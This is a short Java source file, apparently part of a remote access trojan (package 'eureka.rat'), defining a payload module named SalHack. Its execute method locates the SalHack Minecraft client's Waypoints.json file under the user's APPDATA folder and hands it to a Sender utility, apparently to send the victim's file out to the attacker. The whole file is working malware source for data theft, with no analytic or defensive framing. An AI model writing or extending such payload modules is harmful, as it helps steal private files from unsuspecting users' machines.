package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.util.Optional;

public class SalHack implements Payload {
    @Override
    public void execute() throws Exception {
        Optional<File> file = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\SalHack\\Waypoints\\Waypoints.json");
        file.ifPresent(Sender::send);
    }
}
